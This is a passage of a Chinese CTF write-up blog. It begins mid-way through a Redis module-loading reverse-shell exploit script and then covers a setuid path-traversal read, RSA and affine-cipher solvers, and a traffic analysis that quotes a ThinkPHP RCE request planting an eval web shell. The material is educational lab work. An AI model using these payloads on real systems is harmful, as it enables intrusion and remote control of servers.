&quot;*1\r\n$7\r\nCOMMAND\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload2 = &quot;*2\r\n$4\r\nauth\r\n$26\r\nhehe_redis_goes_brrrrrrrrr\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload3 = &quot;*3\r\n$6\r\nmodule\r\n$4\r\nload\r\n$14\r\n/tmp/module.so\r\n&quot;;</span></span><br><span class="line"><span class="string">$payload4 = &quot;*3\r\n$10\r\nsystem.rev\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_host)&#125;</span>\r\n<span class="subst">&#123;l_host&#125;</span>\r\n$<span class="subst">&#123;<span class="built_in">len</span>(l_port)&#125;</span>\r\n<span class="subst">&#123;l_port&#125;</span>\r\n&quot;;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload1, strlen($payload1));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload2, strlen($payload2));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload3, strlen($payload3));</span></span><br><span class="line"><span class="string">$out = socket_read($socket, 2048);</span></span><br><span class="line"><span class="string">echo $out;</span></span><br><span class="line"><span class="string">socket_write($socket, $payload4, strlen($payload4));</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">print(rce(revershell_payload))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+] Check your nc!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/06/Kx6eHQkbVXG7Yy1.png" alt="image.png"></p>
<p><code>cat /flag</code>发现没权限，而之前有个记录 payload 的函数有提示我们使用 readlog 查看记录。</p>
<p>看下 binary</p>
<p><img src="https://i.loli.net/2021/10/06/PUHOfbaoTFte3M1.png" alt="image.png"></p>
<p>是个 setuid</p>
<p>不妨执行下 发现可以目录穿越，读出 flag</p>
<p><img src="https://i.loli.net/2021/10/06/W4gTGpZsIqk2odc.png" alt="image.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="EZ-Crypto"><a href="#EZ-Crypto" class="headerlink" title="EZ Crypto"></a>EZ Crypto</h3><p>仿射密码</p>
<p>直接上脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">    gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a, m</span>):</span></span><br><span class="line">    gcd, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> gcd != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>  <span class="comment"># modular inverse does not exist</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    C = (a*P + b) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((key[<span class="number">0</span>]*(<span class="built_in">ord</span>(t) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) + key[<span class="number">1</span>]) % <span class="number">26</span>)</span><br><span class="line">                        + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> t <span class="keyword">in</span> text.upper().replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">cipher, key</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    P = (a^-1 * (C - b)) % 26</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(((modinv(key[<span class="number">0</span>], <span class="number">26</span>)*(<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - key[<span class="number">1</span>]))</span><br><span class="line">                         % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> cipher])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = [<span class="number">17</span>, <span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;EKZZJKZZYUBBAHK&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;decrypt(c, key)&#125;</span>&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;WELLHELLOAFFINE&#125;</code></p>
<h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h3><p>CtfRsaTool 一把梭 <code>comfact_cn</code>可出</p>
<p>由于 m 中包含了 p 那么我们可以通过 求 c 与 n 的最大公约数求出 q</p>
<p>后面按照标准流程解密就好了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">13099786225848114426288735042622063709429417979653559902255130110659975926568234663676756524835204106945448519122951053919052978834452790083656081239724399724465813907281626036733220108031627090004400217055377991780064228481074731242267303495888888602962900043528353166689119375820829095012486469286192640858709120034967539197423507664888963829638473265043059180698438334763097949285344221617697610851153154943002108316864408271636493080517356530114745146546897588878707507824683476104289624176537904920121831095000551916845112223416432133409395056783383953717096046196532887274225485656111146665584317804803318338909</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">8559655499265896361118223899353477299042241757209602984255991793623671902400849937041183417595204298397177450326134011299326668532961582184674623363025538600270072707047163533208789053017456849333485228029982885219677656015050632558654985633574879301710404077674861745881754178023445783080693280818480184811356779954303543761230708350552871210348291625654157493398915163250634555513484314769991628473845225469274037082850635228850870120629706273968570480643866051827420679768935556198892958086984241175115383476535497399981543828236629739929537486115788597861436866044189520462578886229791185703549894677979975800817</span></span><br><span class="line"></span><br><span class="line">p = GCD(n, c)</span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line">m = M // <span class="number">114514</span> // p</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>flag&#123;f299e536-71df-2a9c-4189-1541f4724e2b&#125;</code></p>
<h3 id="我大E了"><a href="#我大E了" class="headerlink" title="我大E了"></a>我大E了</h3><p>这里看到的 e 非常大，可以使用 <code>wiener</code>求d <a target="_blank" rel="noopener" href="https://github.com/orisano/owiener，有了d">https://github.com/orisano/owiener，有了d</a>, n e2我们就能求出 p, q 再往后就能可以根据 RSA 的标准流程处理解密了</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes, GCD</span><br><span class="line"><span class="keyword">import</span> wiener</span><br><span class="line"><span class="keyword">import</span> fractions</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/orisano/owiener</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x10001</span></span><br><span class="line">e2 = <span class="number">30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599</span></span><br><span class="line">n = <span class="number">109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span></span><br><span class="line">c1 = <span class="number">71583783682021619717999479268651786751161610363987881699058479972417097127681864247477848165312443269552261650281395262160728715862254920244393628296570316218768130014057719355479608374320909554953446063226545440801131248900137089609895608341522946793200814556574254250659621793341199431483521650853287065268462347854129303033847182723629092195909957117089056444411650802573134427914604925772044236086815457154819679424034812539639758661460317397185002960311032637913793371456665287379240275667317336526891584182621458450580573412613408361770289740079739848770272206592041842234862740865747628519852066267368160881640</span></span><br><span class="line">c2 = <span class="number">55494113780323304422454443648470010911900254740052633133363579960778021288760719271727939446265317907324037593785145992975447677054351886369334354944686849950347151902030735393458784973074467509096895699845403768218581207266475016330668907743203265620833738555574220981953741412558878717721926421279776436821288860990364711094386574370156520178658536435862325596193413858200565399019959529641748661306266278353593276972984410712399939855516008418931398046437081154108451462740956025357863828658378552113064369320441912407668462443383302645820142910970079821181611519951712237177739140891042508920500678667417508093499</span></span><br><span class="line"></span><br><span class="line">d2 = wiener.attack(e2, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/ius/rsatool/blob/master/rsatool.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor_modulus</span>(<span class="params">n, d, e</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Efficiently recover non-trivial factors of n</span></span><br><span class="line"><span class="string">    See: Handbook of Applied Cryptography</span></span><br><span class="line"><span class="string">    8.2.2 Security of RSA -&gt; (i) Relation to factoring (p.287)</span></span><br><span class="line"><span class="string">    http://www.cacr.math.uwaterloo.ca/hac/</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    t = (e * d - <span class="number">1</span>)</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        quotient, remainder = <span class="built_in">divmod</span>(t, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> remainder != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        s += <span class="number">1</span></span><br><span class="line">        t = quotient</span><br><span class="line"></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> found:</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        a = random.randint(<span class="number">1</span>, n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> i &lt;= s <span class="keyword">and</span> <span class="keyword">not</span> found:</span><br><span class="line">            c1 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i-<span class="number">1</span>, n) * t, n)</span><br><span class="line">            c2 = <span class="built_in">pow</span>(a, <span class="built_in">pow</span>(<span class="number">2</span>, i, n) * t, n)</span><br><span class="line"></span><br><span class="line">            found = c1 != <span class="number">1</span> <span class="keyword">and</span> c1 != (-<span class="number">1</span> % n) <span class="keyword">and</span> c2 == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># p = fractions.gcd(c1-1, n)</span></span><br><span class="line">    p = GCD(c1-<span class="number">1</span>, n)</span><br><span class="line">    q = n // p</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = factor_modulus(n, d2, e2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d1 = inverse(e1, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1, d1, n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><code>flag&#123;14c78aaf-9221-1899-3a7f-0f287f3f6790&#125;</code></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="EZ-Traffic"><a href="#EZ-Traffic" class="headerlink" title="EZ Traffic"></a>EZ Traffic</h3><p>流量审计</p>
<p><img src="https://i.loli.net/2021/10/06/R64rmEy1WZbNAes.png" alt="image.png"></p>
<p>先看下统计 HTTP 偏多, 那就看看 HTTP 服务</p>
<p>看下 HTTP</p>
<p><img src="https://i.loli.net/2021/10/06/foxFKILSE5WJTZN.png" alt="image.png"></p>
<p>这几个 traffic 蛮可疑的</p>
<p><img src="https://i.loli.net/2021/10/06/TirEoF2bjepLSB5.png" alt="image.png"></p>
<p>还有一个 <code>flag.zip</code></p>
<p>我们不妨先把这个文件解出来 发现有密码 就继续往上看</p>
<p><code>config.php?cmd=xxxx</code>比较可疑 base64 解码后看不到内容 那就继续往上看</p>
<blockquote>
<p>GET /?s=index%7Cthink%5Capp%2Finvokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=file_put_contents&amp;vars%5B1%5D%5B0%5D=config.php&amp;vars%5B1%5D%5B1%5D=%3C%3Fphp+eval%28gzinflate%28base64_decode%28%24_REQUEST%5B%22cmd%22%5D%29%29%29%3B+%3F%3E HTTP/1.1<br>Host: 47.100.41.68<br>User-Agent: python-requests/2.25.1<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Connection: keep-alive</p>
</blockquote>
<p>发现这里写了一个 <code>config.php</code> 的马 内容为 <code>&lt;?php eval(gzinflate(base64_decode($_REQUEST[&#39;cmd&#39;])));</code></p>
<p>所以我们还需要一个 gzinflate</p>
<p>下面看 response 部分 发现 包 3214 有返回 zip 的结果 我们给他的 request 解密</p>
<p><code>echo system(&quot;zip --password K5bi8UgMNGC97QhPHgpRrrWtYZYkoe7C flag.zip /flag&quot;);</code></p>
<p>解压得 flag</p>
<p><img src="https://i.loli.net/2021/10/06/osuF7vlwx3UMLjI.png" alt="image.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Alex</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/11/UJNCTF校赛wp/">http://example.com/2021/10/11/UJNCTF校赛wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">Alex's blog~</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/reverse/">reverse</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/misc/">misc</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/10/26/%E5%A4%87%E8%B5%9B%E9%80%89%E6%8B%A9%E9%A2%98%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/"><i class="fa fa-chevron-left">  </i><span>备赛选择题大赛决赛之被迫成为web手</span></a></div><div class="next-post pull-right"><a href="/2021/09/25/DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B/"><span>DASCTF-Sept-X-浙江工业大学秋季挑战赛wp</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2021/03/05/xqReclzVihJKGUu.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021.03.05 - 2024 By Alex</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>